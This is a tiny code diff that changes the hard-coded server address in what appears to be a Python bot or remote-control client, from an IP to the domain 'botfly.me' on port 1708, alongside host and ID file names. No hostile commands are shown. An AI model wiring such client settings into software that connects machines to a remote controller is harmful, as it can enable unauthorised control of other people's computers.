@@ -4,7 +4,7 @@ import subprocess
 import sys
 import platform
 
-HOST = '50.159.66.236'
+HOST = 'botfly.me'
 PORT = 1708
 HOSTINFOFILE = '.host'
 IDFILE = '.id'
